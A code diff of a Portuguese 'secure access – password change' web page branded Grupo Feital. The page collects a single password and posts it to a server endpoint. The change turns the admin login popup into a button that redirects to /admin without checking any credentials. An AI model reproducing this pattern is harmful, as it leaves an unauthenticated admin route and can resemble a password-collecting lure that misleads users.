@@ -3,16 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <title>Acesso Seguro – Alteração de Senha</title>
-  <link rel="icon" href="Icon.png" >
+  <link rel="icon" href="Icon.png">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <link href="style.css" rel="stylesheet">
-
 </head>
 <body>
   <nav>
-    <button class="btn_nav"  onclick="abrirPopup()">Admin</button>
+    <button class="btn_nav" onclick="abrirPopup()">Admin</button>
   </nav>
-
 
   <h2>Acesso Seguro – Alteração de Senha</h2>
   <p>Sua privacidade é importante para nós. Por isso, sua senha não será visível.</p>
@@ -29,13 +27,13 @@
   <img src="FeitalLogo.png" alt="Grupo Feital" />
 
   <div class="overlay" id="overlay"></div>
-    <div class="popup" id="popup">
+  <div class="popup" id="popup">
     <h3>Login de Admin</h3>
-      <form action="server.js" method="POST">
-        <input type="text" name="usuario" placeholder="Usuário">
-        <input type="password" name="senha" placeholder="Senha">
-        <button type="submit">Entrar</button>
-      </form>
+    <form onsubmit="return false;">
+      <input type="text" name="usuario" placeholder="Usuário">
+      <input type="password" name="senha" placeholder="Senha">
+      <button onclick="irParaAdmin()">Entrar</button>
+    </form>
   </div>
 
   <script>
@@ -51,15 +49,15 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
-    // Fecha o popup clicando fora dele
+    // Fecha ao clicar fora
     document.getElementById('overlay').addEventListener('click', fecharPopup);
 
-    // Script de envio de senha normal
+    // Enviar senha
     document.getElementById("senhaForm").addEventListener("submit", async function (e) {
       e.preventDefault();
       const senha = document.getElementById("senha").value;
 
-      const response = await fetch("https://SEU-SERVIDOR/api/senha", {
+      const response = await fetch("/api/senha", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -74,6 +72,11 @@
         alert("Erro ao enviar senha.");
       }
     });
+
+    // Redireciona para o admin
+    function irParaAdmin() {
+      window.location.href = "/admin";
+    }
   </script>
 </body>
 </html>
